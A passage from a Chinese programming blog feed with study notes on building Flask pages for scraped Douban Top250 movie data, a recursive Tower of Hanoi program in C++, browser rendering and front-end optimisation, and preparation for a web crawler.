<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210517144630529.png" alt="image-20210517144630529"></p>
<h2 id="团队页面"><a href="#团队页面" class="headerlink" title="团队页面"></a>团队页面</h2><p>把Our Team Section里面的四个人去掉三个div，然后图片改改，文字改改就好了</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210517145036502.png" alt="image-20210517145036502"></p>
<p>整个可视化项目基本完结，撒花。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=37" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=37</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>数据可视化-首页制作</title>
    <url>/2021/05/15/homepage/</url>
    <content><![CDATA[<p>学完Flask框架的基础后，跟着老师应用flask做了几个页面来显示前面爬到的电影数据<a id="more"></a></p>
<h2 id="找网页素材"><a href="#找网页素材" class="headerlink" title="找网页素材"></a>找网页素材</h2><p>可以去<a href="http://www.cssmoban.com/" target="_blank" rel="noopener">模板之家</a>或者<a href="http://www.mobanwang.com/" target="_blank" rel="noopener">模板王</a>等类似的资源网站找一些好看的页面，当然很多都开始收费了，找自己喜欢的又免费的可能需要花点时间。</p>
<p>我用的是下面这个模板页面</p>
<p><a href="http://www.cssmoban.com/preview/index.html?url=http://demo.kangjingept.com:8020/cssthemes6/btmd_12_Mamba/index.html&amp;id=9296" target="_blank" rel="noopener">http://www.cssmoban.com/preview/index.html?url=http://demo.kangjingept.com:8020/cssthemes6/btmd_12_Mamba/index.html&amp;id=9296</a></p>
<h2 id="魔改"><a href="#魔改" class="headerlink" title="魔改"></a>魔改</h2><p>在这个模板页面基础上进行一些修改，在浏览器里F12元素快速定位找到需要删除或修改的元素位置，然后在Pycharm里ctrl+f查找到然后删除或修改</p>
<p>1.把顶部的contact……(Top Bar的section)去掉</p>
<p>2.把底部的footer-top去掉</p>
<p>3.中间部分，只留下Our Team Section的title和Counts Section，其他的全部删掉</p>
<p>4.修改剩下元素的内容为豆瓣电影TOP250相关的内容</p>
<p>结果如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515221327431.png" alt="image-20210515221327431"></p>
<p>那四个小图标如果觉得不好看，可以去<a href="https://www.iconfont.cn/找一些喜欢的图标来替换" target="_blank" rel="noopener">https://www.iconfont.cn/找一些喜欢的图标来替换</a></p>
<p>temp.html是最后修改完的页面，然后把这个页面复制，再粘贴新建新的相同界面的页面，我新建了index.html、movie.html、score.html、word.html、team.html。目录结构如下</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515221711401.png" alt="image-20210515221711401"></p>
<p>然后把留下来的Counts Section里的图像外加上a标签，使其成为图片连接，可以点击图标跳转到相应的页面；把页面左上角的MAMBA的href改为index，点击它可以跳转到首页。</p>
<p>最后把movie.html改一下，把四个图标去掉就留下一个灰色背景的div，在里面写一个表格来显示之前爬豆瓣电影到数据库的数据，并且在电影中文名上加一个a标签，使它能点击访问。代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;!-- &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Counts Section &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; --&gt;</span><br><span class="line">&lt;section class&#x3D;&quot;counts section-bg&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">      &lt;table class&#x3D;&quot;table table-striped&quot;&gt;&lt;!--bootstrap样式--&gt;</span><br><span class="line">          &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;排名&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;电影中文名称&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;电影外国名称&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;评分&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;评价人数&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;寓意&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;相关信息&lt;&#x2F;td&gt;</span><br><span class="line">          &lt;&#x2F;tr&gt;</span><br><span class="line">          &#123;% for movie in movies %&#125;</span><br><span class="line">              &lt;tr&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[0] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;</span><br><span class="line">                  &lt;a href&#x3D;&quot;&#123;&#123; movie[1] &#125;&#125;&quot; target&#x3D;&quot;_blank&quot;&gt;</span><br><span class="line">                  &#123;&#123; movie[3] &#125;&#125;</span><br><span class="line">                  &lt;&#x2F;a&gt;</span><br><span class="line">              &lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[4] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[5] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[6] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[7] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;td&gt;&#123;&#123; movie[8] &#125;&#125;&lt;&#x2F;td&gt;</span><br><span class="line">              &lt;&#x2F;tr&gt;</span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">      &lt;&#x2F;table&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;&lt;!-- End Counts Section --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="用Flask路由相应网页"><a href="#用Flask路由相应网页" class="headerlink" title="用Flask路由相应网页"></a>用Flask路由相应网页</h2><p>用前面学的基础语法写6个路由就行了，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask,render_template</span><br><span class="line">import sqlite3</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def home():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)</span><br><span class="line">def index():</span><br><span class="line">    #return render_template(&quot;index.html&quot;)</span><br><span class="line">    return home()</span><br><span class="line">@app.route(&#39;&#x2F;movie&#39;)</span><br><span class="line">def movie():</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    con&#x3D;sqlite3.connect(&quot;movie.db&quot;)</span><br><span class="line">    cur&#x3D;con.cursor()</span><br><span class="line">    sql&#x3D;&quot;select * from movie250&quot;</span><br><span class="line">    data&#x3D;cur.execute(sql)</span><br><span class="line">    for item in data:</span><br><span class="line">        datalist.append(item)</span><br><span class="line">    cur.close()</span><br><span class="line">    con.close()</span><br><span class="line">    return render_template(&quot;movie.html&quot;,movies&#x3D;datalist)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;score&#39;)</span><br><span class="line">def score():</span><br><span class="line">    return render_template(&quot;score.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;word&#39;)</span><br><span class="line">def word():</span><br><span class="line">    return render_template(&quot;word.html&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;team&#39;)</span><br><span class="line">def team():</span><br><span class="line">    return render_template(&quot;team.html&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>这样基本就写完了，看下效果：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210515224559569.png" alt="image-20210515224559569"></p>
<p>最后还有一些问题，比如250部电影信息如果全部放在一页显示的话太多了，最好分页显示，不仅加快了访问速度还提高了对访问者的友好度。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=32" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=32</a></p>
<p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?p=33" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?p=33</a></p>
]]></content>
      <categories>
        <category>数据可视化</category>
      </categories>
  </entry>
  <entry>
    <title>汉诺塔问题</title>
    <url>/2020/04/21/Hanoi/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>有三个柱子A,B,C。A柱上有N(N&gt;1)个直径大小不同，依小到大编号为1，2，，，n的圆盘。<a id="more"></a>要求把A柱上的圆盘移到C柱上，并仍按照原来的顺序叠放，圆盘移动时遵循下列规则：</p>
<p>1.每次只能移动一个圆盘</p>
<p>2.圆盘可以插在A、B和C柱中的任何一个柱子</p>
<p>3.任何时刻都不能将一个较大的圆盘压在较小的圆盘之上</p>
<p>该问题的解法是用递归算法，算法思想如下：</p>
<p>if n=1，将该盘从A柱移到C柱上，递归结束。</p>
<p>else 将n-1个盘从A柱借助C柱移到B柱上，然后把n盘移到C柱，再把B柱上n-1个盘借助A柱移到C柱</p>
<h1 id="递归代码"><a href="#递归代码" class="headerlink" title="递归代码"></a>递归代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Hanoi</span><br><span class="line">&#x2F;&#x2F;Writed by Tianze on 2020&#x2F;4&#x2F;21</span><br><span class="line">&#x2F;&#x2F;Copyright © 2020 Tianze All rights reserved.</span><br><span class="line">using namespace std;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">void hanoi(int n,char A,char B,char C)&#123;</span><br><span class="line">	if(n&#x3D;&#x3D;1)&#123;</span><br><span class="line">		cout &lt;&lt; &quot;把&quot; &lt;&lt; n &lt;&lt; &quot;号盘从&quot; &lt;&lt; A &lt;&lt; &quot;柱移动到&quot; &lt;&lt; C &lt;&lt; &quot;柱&quot; &lt;&lt; endl; </span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		hanoi(n-1,A,C,B);&#x2F;&#x2F;将n-1个盘借助C柱移到B柱</span><br><span class="line">		cout &lt;&lt; &quot;把&quot; &lt;&lt; n &lt;&lt; &quot;号盘从&quot; &lt;&lt; A &lt;&lt; &quot;柱移动到&quot; &lt;&lt; C &lt;&lt; &quot;柱&quot; &lt;&lt; endl; </span><br><span class="line">		hanoi(n-1,B,A,C);&#x2F;&#x2F;再将B柱上n-1个盘借助A柱移到C柱 </span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line">int main()&#123;</span><br><span class="line">	int n,x;</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	hanoi(n,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><p>写代码前顺便学习了一下C++的基本输入输出语法，在这里记录一下<br>首先要用using namespace std;来指定命名空间的标准库，然后使用带有cin、cout的头文件iostream。</p>
<p>相比于C的scanf和printf，C++的输入输出语法更为简洁方便，难怪很多ACM大佬都是用C++来写程序的，现在理解了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cin&gt;&gt;x1;</span><br><span class="line">cout&lt;&lt;&quot;输入为&quot;&lt;&lt;x1&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>cout最后的endl用于自动换行</p>
</blockquote>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
  </entry>
  <entry>
    <title>浏览器工作原理及前端优化学习</title>
    <url>/2021/04/14/BrowserWorking-and-optimize/</url>
    <content><![CDATA[<p>前面学了DOM，现在再看浏览器的渲染比较好理解。<a id="more"></a></p>
<h1 id="浏览器工作原理"><a href="#浏览器工作原理" class="headerlink" title="浏览器工作原理"></a>浏览器工作原理</h1><h2 id="浏览器组件结构"><a href="#浏览器组件结构" class="headerlink" title="浏览器组件结构"></a>浏览器组件结构</h2><p>1.用户界面，包括地址栏、前进/后退/刷新/停止/主页等按钮、书签菜单等。除了浏览器主窗口显示用户请求的页面外，其他显示的各个部分都属于用户界面。</p>
<p>2.浏览器引擎，处于用户界面和渲染引擎之间，负责在两者之间传递操作</p>
<p>3.渲染引擎，负责显示请求的内容，对于HTML，就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。</p>
<p>4.网络，负责网络调用，如HTTP请求</p>
<p>5.JavaScript解释器，解析和执行JavaScript代码，比如chrome的javascript解释器是V8</p>
<p>6.用户界面后端，用于绘制基本的窗口小部件，比如下拉框和窗口</p>
<p>7.数据存储，这是数据持久层，浏览器需要将各种数据保存在本地硬盘，比如cookie</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210414145207.png" alt=""></p>
<p>Chrome浏览器每个标签页都对应一个渲染引擎实例，每个标签页都是一个进程，一定程度上说明了Chrome浏览器比较占内存的原因</p>
<h2 id="渲染引擎的工作流程"><a href="#渲染引擎的工作流程" class="headerlink" title="渲染引擎的工作流程"></a>渲染引擎的工作流程</h2><blockquote>
<p>渲染引擎，我们一般也称为浏览器内核，可以说是浏览器最重要的一个模块。 Firefox使用基于Mozilla的Gecko，而Safari和Chrome使用的是Webkit。渲染引擎主要工作就是依据HTMl、XML、CSS等代码文档的描述，把页面显示出来。</p>
</blockquote>
<h3 id="流程示意图"><a href="#流程示意图" class="headerlink" title="流程示意图"></a>流程示意图</h3><p>Webkit：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/20210414151428.png" alt="image-20210414151428745"></p>
<p>Gecko：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210414151530114.png" alt="image-20210414151530114"></p>
<p>两个渲染引擎虽然叫法不一样，但是整体流程基本差不多。</p>
<p>1.首先，渲染引擎通过网络组件获取请求的内容(HTML、CSS、JS代码等)</p>
<p>2.获取到内容后，渲染引擎会进行下列流程进行渲染工作</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/flow.png" alt="image"></p>
<h3 id="渲染过程"><a href="#渲染过程" class="headerlink" title="渲染过程"></a>渲染过程</h3><p>1.解析HTML生成DOM树</p>
<p>2.解析CSS生成CSSOM树</p>
<p>3.将DOM树和CSSOM树合并生成渲染树(Render Tree)</p>
<p>4.遍历渲染树开始布局，计算每个节点的位置大小信息。</p>
<p>5.绘制渲染树，渲染引擎会遍历渲染树，通过用户界面后端，将节点绘制出来。</p>
<h3 id="构建DOM树"><a href="#构建DOM树" class="headerlink" title="构建DOM树"></a>构建DOM树</h3><p>HTML 文档中的所有内容皆是节点，各节点之间拥有层级关系，如父子关系、兄弟关系等，彼此相连，构成DOM树。最常见的几种节点有：文档节点、元素节点、文本节点、属性节点、注释节点。</p>
<p>DOM节点树中节点与HTML文档中内容一一对应，DOM树构建过程：读取html文档，将字节转换成字符，确定tokens（标签），再将tokens转换成节点，以节点构建 DOM 树。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/1227776-20180608181358236-1251504382.png" alt="img"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/1227776-20180608180854559-1390993721.png" alt="img"></p>
<h3 id="构建CSSOM树"><a href="#构建CSSOM树" class="headerlink" title="构建CSSOM树"></a>构建CSSOM树</h3><p> CSS文档中，所有元素皆是节点，与HTML文件中的标签节点一一对应。CSS中各节点之间同样拥有层级关系，如父子关系、兄弟关系等，彼此相连，构成CSSOM树。</p>
<p>在构建DOM树的过程中，在 HTML 文档的 head 标签中遇到 link 标签，该标签引用了一个外部CSS样式表。由于预见到需要利用该CSS资源来渲染页面，浏览器会立即发出对该CSS资源的请求，并进行CSSDOM树的构建。</p>
<p>CSSOM树构建过程与DOM树构建流程一致：读取CSS文档，将字节转换成字符，确定tokens（标签），再将tokens转换成节点，以节点构建 CSSOM 树。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/1227776-20180611113449533-1302562356.png" alt="img"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/1227776-20180611113210061-2009638399.png" alt="img"></p>
<p>.CSS文件，又名层叠样式表。当CSSOM树生成节点时，每一个节点首先会继承其父节点的所有样式，层叠覆盖，然后再以”向下级联”的规则，为该节点应用更具体的样式，递归生成CSSOM树。譬如，上右图中第二层的p节点，有父节点body，因此该p将继承body节点的样式：”font-size: 16px;”。然后再应用该p节点自身的样式：”font-weight: bold;”。所以最终该p节点的样式为：”font-size: 16px;font-weight: bold;”。</p>
<h3 id="渲染阻塞——加载JS"><a href="#渲染阻塞——加载JS" class="headerlink" title="渲染阻塞——加载JS"></a>渲染阻塞——加载JS</h3><p>若在构建DOM树的过程中，当 HTML 解析器遇到一个 script 标记时，即遇到了js，将立即阻塞DOM树的构建，将控制权移交给 JavaScript 引擎，等到 JavaScript 引擎运行完毕，浏览器才会从中断的地方恢复DOM树的构建。<br>其根本原因在于，JS会对DOM节点进行操作，浏览器无法预测未来的DOM节点的具体内容，为了防止无效操作，节省资源，只能阻塞DOM树的构建。譬如，若不阻塞DOM树的构建，若JS删除了某个DOM节点A，那么浏览器为构建此节点A花费的资源就是无效的。</p>
<p>若在HTML头部加载JS文件，由于JS阻塞，会推迟页面的首绘。为了加快页面渲染，一般将JS文件放到HTML底部进行加载，或是对JS文件执行async或defer加载。</p>
<p>如果JavaScript脚本还操作了CSSOM，而正好这个CSSOM还没有下载和构建，浏览器甚至会延迟脚本执行和构建DOM，直至完成其CSSOM的下载和构建。</p>
<p>所以，script 标签的位置很重要。实际使用时，可以遵循下面两个原则：</p>
<p>CSS 优先：引入顺序上，CSS 资源先于 JavaScript 资源。<br>JS置后：我们通常把JS代码放到页面底部，且JavaScript 应尽量少影响 DOM 的构建。</p>
<p>当解析html的时候，会把新来的元素插入dom树里面，同时去查找css，然后把对应的样式规则应用到元素上，查找样式表是按照从右到左的顺序去匹配的。</p>
<p>例如： div p {font-size: 16px}，会先寻找所有p标签并判断它的父标签是否为div之后才会决定要不要采用这个样式进行渲染）。<br>所以，我们平时写CSS时，尽量用id和class，千万不要过渡层叠。</p>
<h3 id="构建渲染树"><a href="#构建渲染树" class="headerlink" title="构建渲染树"></a>构建渲染树</h3><p>通过DOM树和CSS规则树我们便可以构建渲染树。浏览器会先从DOM树的根节点开始遍历每个可见节点。对每个可见节点，找到其适配的CSS样式规则并应用。</p>
<p>渲染树构建完成后，每个节点都是可见节点并且都含有其内容和对应规则的样式。这也是渲染树与DOM树的最大区别所在。渲染树是用于显示，那些不可见的元素当然就不会在这棵树中出现了，譬如。除此之外，display等于none的也不会被显示在这棵树里头，但是visibility等于hidden的元素是会显示在这棵树里头的。</p>
<p>渲染树（Render Tree）由DOM树、CSSOM树合并而成，但并不是必须等DOM树及CSSOM树加载完成后才开始合并构建渲染树。三者的构建并无先后条件，亦非完全独立，而是会有交叉，并行构建。因此会形成一边加载，一边解析，一边渲染的工作现象。</p>
<h3 id="渲染树布局"><a href="#渲染树布局" class="headerlink" title="渲染树布局"></a>渲染树布局</h3><p>布局阶段会从渲染树的根节点开始遍历，然后确定每个节点对象在页面上的确切大小与位置，布局阶段的输出是一个盒子模型，它会精确地捕获每个元素在屏幕内的确切位置与大小。</p>
<h3 id="渲染树绘制"><a href="#渲染树绘制" class="headerlink" title="渲染树绘制"></a>渲染树绘制</h3><p>在绘制阶段，遍历渲染树，调用渲染器的paint()方法在屏幕上显示其内容。渲染树的绘制工作是由浏览器的UI后端组件完成的。</p>
<h3 id="页面的重绘-repaint-和重排-reflow"><a href="#页面的重绘-repaint-和重排-reflow" class="headerlink" title="页面的重绘(repaint)和重排(reflow)"></a>页面的重绘(repaint)和重排(reflow)</h3><p>根据渲染树布局，计算CSS样式，即每个节点在页面中的大小和位置等几何信息。HTML默认是流式布局的，CSS和js会打破这种布局，改变DOM的外观样式以及大小和位置。这时就要提到两个重要概念：repaint和reflow。</p>
<p>replaint：屏幕的一部分重画，不影响整体布局，比如某个CSS的背景色变了，但元素的几何尺寸和位置不变。</p>
<p>reflow：也称回流，当渲染树节点发生改变，影响了节点的几何属性（如宽、高、内边距、外边距、或是float、position、display：none;等等），导致节点位置发生变化，此时触发浏览器重排（reflow），需要重新生成渲染树。譬如JS为某个p标签节点添加新的样式：”display:none;”。导致该p标签被隐藏起来，该p标签之后的所有节点位置都会发生改变。此时浏览器需要重新生成渲染树，重新布局，即重排（reflow）。</p>
<p>重排必将引起重绘，而重绘不一定会引起重排，并且我们应该减少和避免repaint和reflow。</p>
<h1 id="前端性能优化"><a href="#前端性能优化" class="headerlink" title="前端性能优化"></a>前端性能优化</h1><h2 id="提高网页加载速度的必要性"><a href="#提高网页加载速度的必要性" class="headerlink" title="提高网页加载速度的必要性"></a>提高网页加载速度的必要性</h2><p>总而言之就是增加用户体验好感</p>
<h2 id="前端性能优化方案"><a href="#前端性能优化方案" class="headerlink" title="前端性能优化方案"></a>前端性能优化方案</h2><h3 id="减少DNS查找"><a href="#减少DNS查找" class="headerlink" title="减少DNS查找"></a>减少DNS查找</h3><p>DNS查找，即浏览器根据url中域名，查找该域名对应的服务器IP地址，然后才能根据服务器IP地址，下载到文件。</p>
<p>一般而言，电脑会进行DNS缓存，包括浏览器缓存、系统缓存、路由器缓存、ISP DNS缓存。所以，浏览器DNS查找顺序一般是这样的：浏览器缓存→系统缓存→路由器缓存→ISP DNS 缓存→递归搜索。</p>
<p>递归搜索，即ISP的DNS服务器从根域名开始进行递归查询，查找时间一般为20-120ms。</p>
<p>若没有DNS缓存，才会执行DNS递归搜索。但是显而易见，第一次访问网站首页时，是不会有DNS缓存的，必然会执行DNS查找。而每一个DNS查找，需要耗时20-120ms。因此，减少DNS查找能加快网页加载速度。</p>
<p>实例：将网站所需的文件下载到本地，而不是调用别人支持的CDN。</p>
<h3 id="CSS优先加载，JS延迟加载"><a href="#CSS优先加载，JS延迟加载" class="headerlink" title="CSS优先加载，JS延迟加载"></a>CSS优先加载，JS延迟加载</h3><p>在解析HTML文件，构建DOM树时，一旦遇到link标记时，即遇到了CSS样式表，将之下载，便可立即构建渲染树，从而立即呈现页面效果。</p>
<p>而一旦遇到script 标记时，即遇到了JS脚本，将立即阻塞DOM树的构建，将控制权移交给 JavaScript 引擎，等到 JavaScript 引擎运行完毕，浏览器才会从中断的地方恢复渲染树的构建。</p>
<p>若将引入JS脚本的链接放到HTML页面顶部，那么在加载该页面时，一旦遇到JS，页面渲染就会停滞，出现一段时间的灰色空白，直到JS加载完成，才会出现页面内容，这对用户体验是不友好的。因此，我们需要将JS脚本放置到页面底部，或者让JS脚本异步或是延迟加载。</p>
<p>从严格意义上来说，CSS的优先加载及JS的延迟加载并不能从根本上提升网页加载速度，但是它们能使网页更快被渲染出来，使页面内容逐步呈现，增加用户等待的耐心，提升用户体验。</p>
<h3 id="减少HTTP请求"><a href="#减少HTTP请求" class="headerlink" title="减少HTTP请求"></a>减少HTTP请求</h3><p>HTTP请求，即客户端到服务器端的请求消息，包括资源请求、数据处理等。</p>
<p>　　HTTP请求需从客户端发起请求，然后由服务器端进行数据处理，然后再返回数据或资源。一般而言，耗时据请求资源的大小，服务器网速，约数ms-数百ms之间。请求资源越大，所花费的时间越长，服务器网速越慢，所花费的时间也越长。</p>
<p>　　一般而言，完成了DNS查找后，接下来便是进行HTTP请求，获取资源。首先下载HTML文件，然后解析HTML文件，根据HTML内容，获取CSS、JS及图片文件。每一个CSS链接、JS链接以及图片链接都是一个HTTP请求。</p>
<p>　　每一个HTTP请求都需要花费额外的时间。因此，我们可以将一些可合并的资源进行合并，譬如将所有页面的css合并成一个style.css文件，譬如将所有页面的js合并成一个function.js文件，再譬如将一批小图标利用ps合成一张图片（此手段效果最显著，也最常用）。虽然有时文件会变大，但是在HTTP请求中，请求下载一个大小为100KB的资源文件，比请求下载两个大小为50KB的资源文件要快。</p>
<h3 id="缩小文件"><a href="#缩小文件" class="headerlink" title="缩小文件"></a>缩小文件</h3><p>众所周知，HTTP请求中，返回的资源越大，HTTP请求所花费的时间越长，因此，缩小资源文件可以提升HTTP请求的速度，进而提升页面加载速度。不仅如此，还能节省服务器流量及空间。</p>
<p>一般而言，缩小文件主要是指图片压缩，也包括CSS、JS文件压缩，网上有成熟的代码在线压缩工具，譬如：<a href="http://tool.oschina.net/jscompress/" target="_blank" rel="noopener">在线JS/CSS/HTML 压缩</a></p>
<p>而图片压缩主要是指图片在不同的格式下、不同的分辨率下保存，其大小将会有巨大的差异。譬如同一张图片的png格式与jpg格式肉眼看起来几乎没有区别，但是其大小相差了约5倍。而jpg格式中级也比高级要小约莫1倍。当然，图片的不同格式有不同的用处，且分辨率越高，图片也越清晰。</p>
<p>因此，根据需求为图片选择合适的格式及分辨率，就能得到最小的图片文件。</p>
<p>具体操作：在ps中打开图片，同时按下ctrl+alt+shift+s，打开”存储为web所用格式”弹框，即可任意选择保存图片的格式及分辨率。</p>
<h3 id="善用缓存"><a href="#善用缓存" class="headerlink" title="善用缓存"></a>善用缓存</h3><p>避免在HTML文件中使用style标签插入CSS样式，及使用script标签插入JS脚本。若在HTML文件中插入CSS及JS，那么它们无法进入缓存，每次刷新页面，都要重新加载，不但浪费了浏览器资源，拖慢了页面加载速度，而且显得冗余且复用性低，不利于日后的维护。因此，将CSS样式与JS脚本分离出来，形成CSS文件及JS文件，就能进入缓存，进而提高页面加载速度。</p>
<p>灵活使用cookie和localstorage。在使用接口时，灵活使用cookie和localstorage来缓存接口返回的信息，避免不必要的接口查询，从而提升页面加载速度。譬如：在登录页面登录时，缓存好用户信息，设置过期时间。在进入用户个人中心页面时，若数据并未过期，可以直接从缓存中取用户信息，不必再调起接口去获取用户信息。</p>
<h3 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h3><p>这块没仔细看，可以参考最后一篇文章</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://moxiaoxi.info/2016/01/30/Browser/" target="_blank" rel="noopener">https://moxiaoxi.info/2016/01/30/Browser/</a></p>
<p><a href="https://juejin.cn/post/6844903565610188807" target="_blank" rel="noopener">https://juejin.cn/post/6844903565610188807</a></p>
<p><a href="https://segmentfault.com/a/1190000017019877" target="_blank" rel="noopener">https://segmentfault.com/a/1190000017019877</a></p>
<p><a href="https://www.cnblogs.com/chenyoumei/p/9156849.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenyoumei/p/9156849.html</a></p>
<p><a href="https://www.cnblogs.com/chenyoumei/p/9167238.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenyoumei/p/9167238.html</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title>爬虫准备工作</title>
    <url>/2021/04/21/preparation-for-crawler/</url>
    <content><![CDATA[<p>以爬取豆瓣电影Top250为例子来学习<a id="more"></a></p>
<h2 id="需要分析的点"><a href="#需要分析的点" class="headerlink" title="需要分析的点"></a>需要分析的点</h2><h3 id="URL分析"><a href="#URL分析" class="headerlink" title="URL分析"></a>URL分析</h3><p>第一页的URL：<code>https://movie.douban.com/top250</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421165440430.png" alt="image-20210421165440430"></p>
<p>第二页的URL：<code>https://movie.douban.com/top250?start=25&amp;filter=</code></p>
<p>把<code>filter</code>参数去掉也正常返回</p>
<p><code>https://movie.douban.com/top250?start=25</code></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421165502559.png" alt="image-20210421165502559"></p>
<p>我把<code>start</code>参数修改成27，也能正常返回：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421165732445.png" alt="image-20210421165732445"></p>
<p>通过这三次响应可以分析出来，<code>start</code>参数是电影序号，如果是27就从显示28个开始显示，至于为什么我猜可能是因为豆瓣在存储这个数据的时候下标从是0开始的。并且每一页25部电影，250部电影数据分10页。</p>
<h3 id="分析页面"><a href="#分析页面" class="headerlink" title="分析页面"></a>分析页面</h3><p>利用开发者工具来分析网页，F12打开开发者工具，在Elements下找到需要的数据位置</p>
<p>点击工具栏最左边的箭头可以定位元素位置，可以快速找到我们需要的数据，最下面那一行也很有用，显示了查找元素所在的标签层级，方便之后获取数据</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421183657096.png" alt="image-20210421183657096"></p>
<p>Network里可以查看HTTP请求相关内容，可以看看请求包里有什么，比如常见的cookie、User-Agent等等</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421183146701.png" alt="image-20210421183146701"></p>
<h3 id="是否需要模拟登录"><a href="#是否需要模拟登录" class="headerlink" title="是否需要模拟登录"></a>是否需要模拟登录</h3><p>有些内容只有登录状态下才能查看，所以要先模拟登录，查看网站的cookie、用户名密码参数等信息然后在python请求的时候加上这部分信息模拟登录，这部分还不是很了解，只是知道有这个点</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/piwefei/p/11171063.html" target="_blank" rel="noopener">python模拟登录的四种方法</a></p>
]]></content>
      <categories>
        <category>爬虫相关</category>
      </categories>
  </entry>
  <entry>
    <title>Git学习笔记</title>
    <url>/2021/03/29/Git-learning/</url>
